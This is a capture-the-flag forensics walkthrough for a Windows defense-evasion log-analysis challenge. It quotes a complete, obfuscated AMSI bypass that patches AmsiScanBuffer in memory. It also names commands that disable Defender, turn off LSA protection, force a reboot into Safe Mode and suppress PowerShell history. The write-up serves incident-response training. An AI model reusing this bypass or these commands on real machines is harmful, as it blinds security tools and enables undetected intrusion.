
![Gu1lf51dUs](https://github.com/user-attachments/assets/97e78c87-7a08-445e-b837-7e8a11becf59)

# Operation Blackout 2025: Smoke & Mirrors 


## Description
In Smoke & Mirrors, players analyze the provided event logs and forensic artifacts to uncover how the attacker disabled or altered security features. They must identify the tools, commands, or scripts used to reduce visibility and reconstruct the methods the attacker used to operate undetected. 


## Scenario
Byte Doctor Reyes is investigating a stealthy post-breach attack where several expected security logs and Windows Defender alerts appear to be missing. He suspects the attacker employed defense evasion techniques to disable or manipulate security controls, significantly complicating detection efforts. Using the exported event logs, your objective is to uncover how the attacker compromised the system's defenses to remain undetected.


## Artifacts
- Microsoft-Windows-Powershell.evtx - FD0391939810806A2518008B77EDF719B17F55D9AF826329FA1A6310AB00FF41
- Microsoft-Windows-Powershell-Operational.evtx - AFF7286F5ADD8D63F306F927D32F857A3CA8DD5AD4147C3BE4273E7A7017A348
- Microsoft-Windows-Sysmon-Operational.evtx - C1BD14FDF13FB4D64A85FEAD50FB200CCC6F369389DB08DB51477185DEEDBECF


## Skills
- Malicious use of PowerShell cmdlets
- Log Analysis
- Analyze and interpret Windows Registry modifications
- Identify how attackers disable or tamper with Windows security features


## Walkthrough
### Task 1: The attacker disabled LSA protection on the compromised host by modifying a registry key. What is the full path of that registry key?
Filter by "HKLM\SYSTEM" in the Windows PowerShell Operational logs to find were the attacker modified the LSA registry key.


### Task 2: Which PowerShell command did the attacker first execute to disable Windows Defender?
Look in the Windows PowerShell logs for the PowerShell cmdlet of "[Set-MpPreference](https://learn.microsoft.com/en-us/powershell/module/defender/set-mppreference?view=windowsserver2025-ps)"; could also search for conditionals with Set-MpPreference such as $true or $false. The first log was executed at '10-04-2025 12:01:35' 


### Task 3: The attacker loaded an AMSI patch written in PowerShell. Which function in the DLL is being patched by the script to effectively disable AMSI?
Search within the Windows-PowerShell-Operational logs for strings relating to '.dll', find that the attacker imported a function named 'Disable-Protection' which modifies 'amsi.dll'. Viewing the full script reveals that it attempts to patch the 'AmsiScanBuffer' function within the DLL.
```PowerShell
CommandInvocation(Add-Type): "Add-Type"
ParameterBinding(Add-Type): name="TypeDefinition"; value="using System;
using System.Runtime.InteropServices;
public class P {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    public static bool Patch() {
        IntPtr h = GetModuleHandle("a" + "m" + "s" + "i" + ".dll");
        if (h == IntPtr.Zero) return false;
        IntPtr a = GetProcAddress(h, "A" + "m" + "s" + "i" + "S" + "c" + "a" + "n" + "B" + "u" + "f" + "f" + "e" + "r");
        if (a == IntPtr.Zero) return false;
        UInt32 oldProtect;
        if (!VirtualProtect(a, (UIntPtr)5, 0x40, out oldProtect)) return false;
        byte[] patch = { 0x31, 0xC0, 0xC3 };
        Marshal.Copy(patch, 0, a, patch.Length);
        return VirtualProtect(a, (UIntPtr)5, oldProtect, out oldProtect);
    }
}"
```


### Task 4: Which command did the attacker use to restart the machine in Safe Mode?
To restart a windows machine in Safe Mode, the command must include the string 'safeboot', searching the Microsoft-Windows-Sysmon-Operational confirms that the attacker executed "bcdedit.exe /set safeboot network".


### Task 5: Which PowerShell command did the attacker use to disable PowerShell command history logging?
Searching for 'Set-PSReadlineOption' in the Windows PowerShell logs reveals that the attacker set the HistorySaveStyle to SaveNothing.
